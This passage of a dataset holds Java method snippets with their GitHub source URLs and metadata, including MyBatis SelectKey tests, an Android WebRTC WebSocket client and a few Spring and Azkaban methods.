null, "modifiers": [], "return_type": "void", "snippet": "  void testInsertTable2() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Map<String, Object> parms = new HashMap<>();\n      parms.put(\"name\", \"Fred\");\n      int rows = sqlSession.insert(\"org.apache.ibatis.submitted.selectkey.Table2.insert\", parms);\n      assertEquals(1, rows);\n      assertEquals(22, parms.get(\"id\"));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34326, "method_name": "testSeleckKeyReturnsNoData", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testSeleckKeyReturnsNoData() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Map<String, String> parms = new HashMap<>();\n      parms.put(\"name\", \"Fred\");\n      Assertions.assertThrows(PersistenceException.class,\n          () -> sqlSession.insert(\"org.apache.ibatis.submitted.selectkey.Table2.insertNoValuesInSelectKey\", parms));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34327, "method_name": "testSeleckKeyReturnsTooManyData", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testSeleckKeyReturnsTooManyData() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Map<String, String> parms = new HashMap<>();\n      parms.put(\"name\", \"Fred\");\n      sqlSession.insert(\"org.apache.ibatis.submitted.selectkey.Table2.insertTooManyValuesInSelectKey\", parms);\n      Assertions.assertThrows(PersistenceException.class,\n          () -> sqlSession.insert(\"org.apache.ibatis.submitted.selectkey.Table2.insertTooManyValuesInSelectKey\", parms));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34328, "method_name": "testAnnotatedInsertTable2", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedInsertTable2() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34329, "method_name": "testAnnotatedInsertTable2WithGeneratedKey", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedInsertTable2WithGeneratedKey() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2WithGeneratedKey(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"barney_fred\", name.getGeneratedName());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34330, "method_name": "testAnnotatedUpdateTable2WithGeneratedKey", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedUpdateTable2WithGeneratedKey() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2WithGeneratedKey(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"barney_fred\", name.getGeneratedName());\n\n        name.setName(\"Wilma\");\n        rows = mapper.updateTable2WithGeneratedKey(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"Wilma_fred\", name.getGeneratedName());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34331, "method_name": "testAnnotatedUpdateTable2WithGeneratedKeyXml", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedUpdateTable2WithGeneratedKeyXml() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2WithGeneratedKeyXml(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"barney_fred\", name.getGeneratedName());\n\n        name.setName(\"Wilma\");\n        rows = mapper.updateTable2WithGeneratedKeyXml(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"Wilma_fred\", name.getGeneratedName());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34332, "method_name": "testAnnotatedInsertTable2WithGeneratedKeyXml", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedInsertTable2WithGeneratedKeyXml() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2WithGeneratedKeyXml(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"barney_fred\", name.getGeneratedName());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34333, "method_name": "testAnnotatedInsertTable2WithSelectKeyWithKeyMap", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedInsertTable2WithSelectKeyWithKeyMap() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2WithSelectKeyWithKeyMap(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"barney_fred\", name.getGeneratedName());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34334, "method_name": "testAnnotatedUpdateTable2WithSelectKeyWithKeyMap", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedUpdateTable2WithSelectKeyWithKeyMap() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2WithSelectKeyWithKeyMap(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"barney_fred\", name.getGeneratedName());\n\n        name.setName(\"Wilma\");\n        rows = mapper.updateTable2WithSelectKeyWithKeyMap(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"Wilma_fred\", name.getGeneratedName());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34335, "method_name": "testAnnotatedInsertTable2WithSelectKeyWithKeyMapXml", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedInsertTable2WithSelectKeyWithKeyMapXml() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2WithSelectKeyWithKeyMapXml(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"barney_fred\", name.getGeneratedName());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34336, "method_name": "testAnnotatedUpdateTable2WithSelectKeyWithKeyMapXml", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedUpdateTable2WithSelectKeyWithKeyMapXml() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2WithSelectKeyWithKeyMapXml(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"barney_fred\", name.getGeneratedName());\n\n        name.setName(\"Wilma\");\n        rows = mapper.updateTable2WithSelectKeyWithKeyMapXml(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"Wilma_fred\", name.getGeneratedName());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34337, "method_name": "testAnnotatedInsertTable2WithSelectKeyWithKeyObject", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedInsertTable2WithSelectKeyWithKeyObject() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2WithSelectKeyWithKeyObject(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"barney_fred\", name.getGeneratedName());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34338, "method_name": "testAnnotatedUpdateTable2WithSelectKeyWithKeyObject", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedUpdateTable2WithSelectKeyWithKeyObject() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2WithSelectKeyWithKeyObject(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"barney_fred\", name.getGeneratedName());\n\n        name.setName(\"Wilma\");\n        rows = mapper.updateTable2WithSelectKeyWithKeyObject(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"Wilma_fred\", name.getGeneratedName());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34339, "method_name": "testAnnotatedUpdateTable2WithSelectKeyWithKeyObjectXml", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedUpdateTable2WithSelectKeyWithKeyObjectXml() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2WithSelectKeyWithKeyObjectXml(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"barney_fred\", name.getGeneratedName());\n\n        name.setName(\"Wilma\");\n        rows = mapper.updateTable2WithSelectKeyWithKeyObjectXml(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"Wilma_fred\", name.getGeneratedName());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34340, "method_name": "testAnnotatedInsertTable2WithSelectKeyWithKeyObjectXml", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedInsertTable2WithSelectKeyWithKeyObjectXml() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable2WithSelectKeyWithKeyObjectXml(name);\n        assertEquals(1, rows);\n        assertEquals(22, name.getNameId());\n        assertEquals(\"barney_fred\", name.getGeneratedName());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34341, "method_name": "testAnnotatedInsertTable3", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedInsertTable3() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable3(name);\n        assertEquals(1, rows);\n        assertEquals(33, name.getNameId());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34342, "method_name": "testAnnotatedInsertTable3_2", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testAnnotatedInsertTable3_2() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n        Name name = new Name();\n        name.setName(\"barney\");\n        AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n        int rows = mapper.insertTable3_2(name);\n        assertEquals(1, rows);\n        assertEquals(33, name.getNameId());\n      }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34343, "method_name": "testSeleckKeyWithWrongKeyProperty", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testSeleckKeyWithWrongKeyProperty() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Name name = new Name();\n      name.setName(\"Kyoto\");\n      Assertions.assertThrows(PersistenceException.class,\n          () -> sqlSession.insert(\"org.apache.ibatis.submitted.selectkey.Table2.insertWrongKeyProperty\", name));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34344, "method_name": "getState", "class_name": "WebSocketChannelClient", "params": [], "throws": null, "modifiers": ["public"], "return_type": "WebSocketConnectionState", "snippet": "  public WebSocketConnectionState getState() {\n    return state;\n  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34345, "method_name": "connect", "class_name": "WebSocketChannelClient", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void connect(final String wsUrl, final String postUrl) {\n    checkIfCalledOnValidThread();\n    if (state != WebSocketConnectionState.NEW) {\n      Log.e(TAG, \"WebSocket is already connected.\");\n      return;\n    }\n    wsServerUrl = wsUrl;\n    postServerUrl = postUrl;\n    closeEvent = false;\n\n    Log.d(TAG, \"Connecting WebSocket to: \" + wsUrl + \". Post URL: \" + postUrl);\n    ws = new WebSocketConnection();\n    wsObserver = new WebSocketObserver();\n    try {\n      ws.connect(new URI(wsServerUrl), wsObserver);\n    } catch (URISyntaxException e) {\n      reportError(\"URI error: \" + e.getMessage());\n    } catch (WebSocketException e) {\n      reportError(\"WebSocket connection error: \" + e.getMessage());\n    }\n  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34346, "method_name": "register", "class_name": "WebSocketChannelClient", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void register(final String roomID, final String clientID) {\n    checkIfCalledOnValidThread();\n    this.roomID = roomID;\n    this.clientID = clientID;\n    if (state != WebSocketConnectionState.CONNECTED) {\n      Log.w(TAG, \"WebSocket register() in state \" + state);\n      return;\n    }\n    Log.d(TAG, \"Registering WebSocket for room \" + roomID + \". ClientID: \" + clientID);\n    JSONObject json = new JSONObject();\n    try {\n      json.put(\"cmd\", \"register\");\n      json.put(\"roomid\", roomID);\n      json.put(\"clientid\", clientID);\n      Log.d(TAG, \"C->WSS: \" + json.toString());\n      ws.sendTextMessage(json.toString());\n      state = WebSocketConnectionState.REGISTERED;\n      // Send any previously accumulated messages.\n      for (String sendMessage : wsSendQueue) {\n        send(sendMessage);\n      }\n      wsSendQueue.clear();\n    } catch (JSONException e) {\n      reportError(\"WebSocket register JSON error: \" + e.getMessage());\n    }\n  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34347, "method_name": "send", "class_name": "WebSocketChannelClient", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void send(String message) {\n    checkIfCalledOnValidThread();\n    switch (state) {\n      case NEW:\n      case CONNECTED:\n        // Store outgoing messages and send them after websocket client\n        // is registered.\n        Log.d(TAG, \"WS ACC: \" + message);\n        wsSendQueue.add(message);\n        return;\n      case ERROR:\n      case CLOSED:\n        Log.e(TAG, \"WebSocket send() in error or closed state : \" + message);\n        return;\n      case REGISTERED:\n        JSONObject json = new JSONObject();\n        try {\n          json.put(\"cmd\", \"send\");\n          json.put(\"msg\", message);\n          message = json.toString();\n          Log.d(TAG, \"C->WSS: \" + message);\n          ws.sendTextMessage(message);\n        } catch (JSONException e) {\n          reportError(\"WebSocket send JSON error: \" + e.getMessage());\n        }\n        break;\n    }\n  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34348, "method_name": "post", "class_name": "WebSocketChannelClient", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void post(String message) {\n    checkIfCalledOnValidThread();\n    sendWSSMessage(\"POST\", message);\n  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34349, "method_name": "disconnect", "class_name": "WebSocketChannelClient", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void disconnect(boolean waitForComplete) {\n    checkIfCalledOnValidThread();\n    Log.d(TAG, \"Disconnect WebSocket. State: \" + state);\n    if (state == WebSocketConnectionState.REGISTERED) {\n      // Send \"bye\" to WebSocket server.\n      send(\"{\\\"type\\\": \\\"bye\\\"}\");\n      state = WebSocketConnectionState.CONNECTED;\n      // Send http DELETE to http WebSocket server.\n      sendWSSMessage(\"DELETE\", \"\");\n    }\n    // Close WebSocket in CONNECTED or ERROR states only.\n    if (state == WebSocketConnectionState.CONNECTED || state == WebSocketConnectionState.ERROR) {\n      ws.disconnect();\n      state = WebSocketConnectionState.CLOSED;\n\n      // Wait for websocket close event to prevent websocket library from\n      // sending any pending messages to deleted looper thread.\n      if (waitForComplete) {\n        synchronized (closeEventLock) {\n          while (!closeEvent) {\n            try {\n              closeEventLock.wait(CLOSE_TIMEOUT);\n              break;\n            } catch (InterruptedException e) {\n              Log.e(TAG, \"Wait error: \" + e.toString());\n            }\n          }\n        }\n      }\n    }\n    Log.d(TAG, \"Disconnecting WebSocket done.\");\n  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34350, "method_name": "reportError", "class_name": "WebSocketChannelClient", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void reportError(final String errorMessage) {\n    Log.e(TAG, errorMessage);\n    handler.post(new Runnable() {\n      @Override\n      public void run() {\n        if (state != WebSocketConnectionState.ERROR) {\n          state = WebSocketConnectionState.ERROR;\n          events.onWebSocketError(errorMessage);\n        }\n      }\n    });\n  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34351, "method_name": "sendWSSMessage", "class_name": "WebSocketChannelClient", "params": ["String", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void sendWSSMessage(final String method, final String message) {\n    String postUrl = postServerUrl + \"/\" + roomID + \"/\" + clientID;\n    Log.d(TAG, \"WS \" + method + \" : \" + postUrl + \" : \" + message);\n    AsyncHttpURLConnection httpConnection =\n        new AsyncHttpURLConnection(method, postUrl, message, new AsyncHttpEvents() {\n          @Override\n          public void onHttpError(String errorMessage) {\n            reportError(\"WS \" + method + \" error: \" + errorMessage);\n          }\n\n          @Override\n          public void onHttpComplete(String response) {}\n        });\n    httpConnection.send();\n  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34352, "method_name": "checkIfCalledOnValidThread", "class_name": "WebSocketChannelClient", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void checkIfCalledOnValidThread() {\n    if (Thread.currentThread() != handler.getLooper().getThread()) {\n      throw new IllegalStateException(\"WebSocket method is not called on valid thread\");\n    }\n  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34353, "method_name": "onOpen", "class_name": "WebSocketObserver", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onOpen() {\n      Log.d(TAG, \"WebSocket connection opened to: \" + wsServerUrl);\n      handler.post(new Runnable() {\n        @Override\n        public void run() {\n          state = WebSocketConnectionState.CONNECTED;\n          // Check if we have pending register request.\n          if (roomID != null && clientID != null) {\n            register(roomID, clientID);\n          }\n        }\n      });\n    }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": ["WebSocketConnectionObserver"], "modifiers": ["private"]}}, {"id": 34354, "method_name": "onClose", "class_name": "WebSocketObserver", "params": ["WebSocketCloseNotification", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClose(WebSocketCloseNotification code, String reason) {\n      Log.d(TAG, \"WebSocket connection closed. Code: \" + code + \". Reason: \" + reason + \". State: \"\n              + state);\n      synchronized (closeEventLock) {\n        closeEvent = true;\n        closeEventLock.notify();\n      }\n      handler.post(new Runnable() {\n        @Override\n        public void run() {\n          if (state != WebSocketConnectionState.CLOSED) {\n            state = WebSocketConnectionState.CLOSED;\n            events.onWebSocketClose();\n          }\n        }\n      });\n    }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": ["WebSocketConnectionObserver"], "modifiers": ["private"]}}, {"id": 34355, "method_name": "onTextMessage", "class_name": "WebSocketObserver", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTextMessage(String payload) {\n      Log.d(TAG, \"WSS->C: \" + payload);\n      final String message = payload;\n      handler.post(new Runnable() {\n        @Override\n        public void run() {\n          if (state == WebSocketConnectionState.CONNECTED\n              || state == WebSocketConnectionState.REGISTERED) {\n            events.onWebSocketMessage(message);\n          }\n        }\n      });\n    }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": ["WebSocketConnectionObserver"], "modifiers": ["private"]}}, {"id": 34356, "method_name": "onRawTextMessage", "class_name": "WebSocketObserver", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRawTextMessage(byte[] payload) {}", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": ["WebSocketConnectionObserver"], "modifiers": ["private"]}}, {"id": 34357, "method_name": "onBinaryMessage", "class_name": "WebSocketObserver", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBinaryMessage(byte[] payload) {}", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/WebSocketChannelClient.java", "stars": "2", "class_props": {"extends": null, "implements": ["WebSocketConnectionObserver"], "modifiers": ["private"]}}, {"id": 34358, "method_name": "blogIndex", "class_name": "index1", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String blogIndex(){\n        return \"site/hpp/index1\";\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/controller/index1.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34359, "method_name": "commence", "class_name": "RestAuthenticationEntryPoint", "params": ["HttpServletRequest", "HttpServletResponse", "AuthenticationException"], "throws": ["IOException", "ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException authException) throws IOException, ServletException {\n        response.setCharacterEncoding(\"UTF-8\");\n        response.setContentType(\"application/json\");\n        response.getWriter().println(JSONUtil.parse(CommonResult.unauthorized(authException.getMessage())));\n        response.getWriter().flush();\n    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/component/RestAuthenticationEntryPoint.java", "stars": "2", "class_props": {"extends": null, "implements": ["AuthenticationEntryPoint"], "modifiers": ["public"]}}, {"id": 34360, "method_name": "getMaxConcurrentRunsOneFlow", "class_name": "ExecutorManager", "params": ["Props"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int getMaxConcurrentRunsOneFlow(final Props azkProps) {\n    // The default threshold is set to 30 for now, in case some users are affected. We may\n    // decrease this number in future, to better prevent DDos attacks.\n    return azkProps.getInt(ConfigurationKeys.MAX_CONCURRENT_RUNS_ONEFLOW,\n        DEFAULT_MAX_ONCURRENT_RUNS_ONEFLOW);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34361, "method_name": "createCleanerThread", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["private"], "return_type": "CleanerThread", "snippet": "  private CleanerThread createCleanerThread() {\n    final long executionLogsRetentionMs = this.azkProps.getLong(\"execution.logs.retention.ms\",\n        DEFAULT_EXECUTION_LOGS_RETENTION_MS);\n    return new CleanerThread(executionLogsRetentionMs);\n  }", "url": 